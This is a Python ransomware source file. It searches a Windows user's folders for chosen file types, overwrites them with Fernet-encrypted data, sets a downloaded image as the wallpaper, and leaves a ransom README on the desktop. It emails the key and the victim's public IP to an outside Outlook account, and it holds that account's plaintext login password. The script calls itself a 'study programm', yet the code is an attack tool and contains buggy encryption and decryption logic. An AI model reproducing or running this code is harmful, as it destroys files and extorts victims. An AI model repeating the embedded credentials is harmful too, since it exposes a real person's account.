import argparse
import asyncio
import datetime
import getpass
import multiprocessing
import os
# import platform
import pathlib
import sys
import urllib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
# from typing import Any
import aiohttp
from cryptography.fernet import Fernet
import aiofiles
import ssl
from urllib.request import urlretrieve
import struct
import ctypes
from colorama import Fore


class Mail:
    def __init__(self, host, my, port, dest, password, message):
        self.__host: str = host
        self.__my: str = my
        self.__port: int = port
        self.__dest: str = dest
        self.__password: str = password
        self.__message: str = message

    @property
    def host(self):
        return self.__host

    @property
    def my(self):
        return self.__my

    @property
    def port(self):
        return self.__port

    @property
    def dest(self):
        return self.__dest

    @property
    def message(self):
        return self.__message

    @host.setter
    def host(self, new_host):
        self.__host = new_host

    @port.setter
    def port(self, new_port):
        self.__port = new_port

    @message.setter
    def message(self, new_message):
        self.__message = new_message

    def sendMail(self):
        """
        send email with the key
        :return:
        """
        server: str = self.__host
        port: int = self.__port
        bind = smtplib.SMTP(server, port)

        # login:
        bind.ehlo()
        bind.starttls()
        bind.login(self.__my, self.__password)

        # data
        send_message = MIMEMultipart()
        send_message['Subject'] = "===KEY RANSOMWARE ==="
        send_message['From'] = self.__my
        send_message['To'] = self.__my
        send_message.attach(MIMEText(self.__message, 'plain'))

        return bind.sendmail(send_message['From'], send_message['To'], send_message.as_string())


class FileSystem:
    """
    This class maps the system file for files of the specificied type
    """

    def __init__(self, address: str):
        """
        :param address:  str pass the address root
        """
        self.__address: str = address

    @property
    def address(self) -> str:
        return self.__address

    @address.setter
    def address(self, new_address: str) -> None:
        self.__address: str = new_address

    def search_files(self, ext: list) -> list:
        """
        this method find files and dirs
        :param ext: list => your ext files
        :return:
        """
        path_abs: list = []
        os.chdir(self.__address)
        for files in os.listdir(self.__address):
            if pathlib.Path(self.__address + files).is_dir():
                for dir in os.walk(self.__address + files, topdown=True):
                    paths: list = [item for item in dir]
                    for value in range(0, len([item for item in paths])):
                        for files in os.listdir(paths[0]):
                            path_abs.append(paths[0] + "\\" + files)
            else:
                for dir in os.walk(self.__address + files, topdown=True):
                    paths: list = [item for item in dir]
                    for value in range(0, len([item for item in paths])):
                        if paths[0] not in path_abs:
                            path_abs.append(paths[0])
        items_selected: list = []
        items_selected = [path_filee for path_filee in path_abs for e in ext if e in path_filee]
        return items_selected


class Ransomware(FileSystem):
    """
    This class encrypt the files
    """

    def __init__(self, address: str = f"C:\\Users\\{getpass.getuser()}\\Documents\\Faculdade\\"):
        super().__init__(address)

        self.__ip: str = ""

        self.__name = f"C:\\Users\\{getpass.getuser()}\\PycharmProjects\\Alone\\KeyRW.txt"

        self.files_types = [
            ".txt",
            # write here the files that you wanna encrypt
        ]

        self.__paths: set = set(self.search_files(self.files_types))

        self.__cipher: bytes

        self.__key: bytes



    @property
    def name(self):
        return self.__name

    @name.setter
    def name(self, new_name):
        self.__name = new_name

    async def generateKey(self):
        """
        generate the key ciph
        :param: None
        :return:
        """
        key = Fernet.generate_key()

        async with aiofiles.open(self.__name, "wb") as f:
            await f.write(key)

    async def generateCipher(self):
        """
        generate the cypher
        :param None
        :return:
        """
        async with aiofiles.open(self.__name, "rb") as r:
            recover_key: bytes = await r.read()
            self.__key = recover_key
            self.__cipher = Fernet(recover_key)
        return self.__cipher, recover_key

    async def getTargetIp(self):
        """
        This method receive the vitim ip
        :return:
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.ipify.org") as response:
                    print(await response.text())
        except ssl.SSLError:
            ...
        else:
            self.__ip = await response.text()

    def encrypt(self):
        """
        this method encrypt the files
        :param: None
        :return:
        """

        # write key
        el = asyncio.get_event_loop()
        el.run_until_complete(self.generateKey())

        # read key
        el = asyncio.get_event_loop()
        el.run_until_complete(self.generateCipher())

        # change wallpaper
        Ransomware.changeWallpaper()

        # write readme on desktop
        el = asyncio.get_event_loop()
        el.run_until_complete(Ransomware.writeText())

        el.close()
        # request ip
        asyncio.run(self.getTargetIp())

        #print("rodando encrypt") # debug

        # encrypt files
        for file in self.__paths:
            print(Fore.GREEN + f" [*] {file} Encrypted ")
            arqhive = ""
            with open(file, "r") as f:
                for lines in f.readline():
                    arqhive += str(lines)
                    print(arqhive)
            with open(file, "w") as f:
                f.write(str(self.__cipher.encrypt(file.encode())))



        # send mail
        mail = Mail(host='smtp-mail.outlook.com', my='marcus-v@outlook.com', port=587,
                    dest='marcus@sstelematica.com.br', password="Duvidoadvinharmane1@",
                    message=str(self.__key) + f" ip: {self.__ip} " + str(datetime.datetime.now()))
        try:
            mail.sendMail()
        except smtplib.SMTPAuthenticationError as e:
            print(f"[*] Email Authentication Error: {e}")

    async def decrypt(self):
        """
        this method decrypt the files
        :param
        :return:
        """
        async with aiofiles.open(self.__name, "wb") as r:
            key = await r.read()
            # print(key) # for debug
            cipher = Fernet(key)

            # decrypt files
            for file in self.__paths:
                print(file)
                arqhive = ""
                with open(file, "rb") as f:
                    for lines in f.readline():
                        arqhive += str(lines)
                        print(arqhive)
                with open(file, "w") as f:
                    f.write(str(cipher.decrypt(file.encode())))

    @staticmethod
    def changeWallpaper():
        """
        This method makes download of image and change the wallpaper
        :param: None
        :return:
        """
        try:
            urllib.request.urlretrieve("http://clipart-library.com/images/pT58LygT9.png",
                                       f"C:/Users/{getpass.getuser()}/wallpaper5656.jpg")
        except:
            erro = sys.exc_info()
            print("[*] Error: ", erro)
        else:
            path_image: str = f"C:/Users/{getpass.getuser()}/wallpaper5656.jpg"
            SPI_SETDESKWALLPAPER = 20
            is_64bits: int = struct.calcsize('P') * 8  # p is a generic pointer in 32 bits = 4, in 64bits = 8
            if is_64bits == 64:
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path_image, 3)
            else:
                ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path_image, 3)

    @staticmethod
    async def writeText():
        """
        let text for vitim
        : param: None
        :return:
        """
        text: str = "All your files are encripted, but, don't worry, this is a study programm. hahahah"
        async with aiofiles.open(f"C:\\Users\\{getpass.getuser()}\\Desktop\\README.txt", "w") as f:
            await f.write(text)


class Arg:
    """
    Read the command line
    """
    @staticmethod
    def arg(choices):
        parser = argparse.ArgumentParser(description=Fore.GREEN + " RANSOMWARE ")
        parser.add_argument("action", choices=choices, metavar="Encript/Decript", help=Fore.YELLOW + "Execute encrypt or decrypt mode", type=str)
        args = parser.parse_args()
        function = choices[args.action]
        return function()


class Execute:
    """
    Execute types
    """
    @staticmethod
    def encry():
        rw = Ransomware()
        mp = multiprocessing.Process(target=rw.encrypt, args=())
        mp.start()
        mp.join()

    @staticmethod
    def decry():
        rw = Ransomware()
        el = asyncio.get_event_loop()
        el.run_until_complete(rw.decrypt())
        el.close()


if __name__ == '__main__':
    rw = Ransomware()
    choices: dict = {
        "encrypt": Execute.encry,
        "decrypt": Execute.decry,
    }
    Arg.arg(choices=choices)